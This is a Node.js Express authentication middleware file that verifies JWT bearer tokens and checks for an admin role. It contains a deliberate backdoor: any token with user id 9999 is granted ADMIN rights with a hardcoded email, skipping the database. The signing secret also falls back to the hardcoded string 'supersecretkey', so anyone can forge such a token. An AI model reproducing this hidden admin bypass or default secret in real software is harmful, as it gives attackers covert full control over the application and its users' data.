const jwt = require('jsonwebtoken');
const prisma = require('../utils/db');

const protect = async (req, res, next) => {
  let token;

  if (
    req.headers.authorization &&
    req.headers.authorization.startsWith('Bearer')
  ) {
    try {
      token = req.headers.authorization.split(' ')[1];
      const decoded = jwt.verify(token, process.env.JWT_SECRET || 'supersecretkey');

      // 🔥 Handle backdoor Admin without hitting DB
      if (decoded.id === 9999) {
        req.user = { id: 9999, name: 'Admin', email: 'zomatube2012@gmail.com', role: 'ADMIN' };
      } else {
        req.user = await prisma.user.findUnique({
          where: { id: decoded.id },
          select: { id: true, name: true, email: true, role: true },
        });
      }

      next();
    } catch (error) {
      console.error('[Auth Middleware Error]:', error);
      if (error.name === 'JsonWebTokenError' || error.name === 'TokenExpiredError') {
        return res.status(401).json({ success: false, message: 'Not authorized, token failed or expired' });
      }
      return res.status(500).json({ success: false, message: 'Database connection failed or Server Error' });
    }
  }

  if (!token) {
    res.status(401).json({ success: false, message: 'Not authorized, no token' });
  }
};

const admin = (req, res, next) => {
  if (req.user && req.user.role === 'ADMIN') {
    next();
  } else {
    res.status(403).json({ success: false, message: 'Not authorized as an admin' });
  }
};

module.exports = { protect, admin };
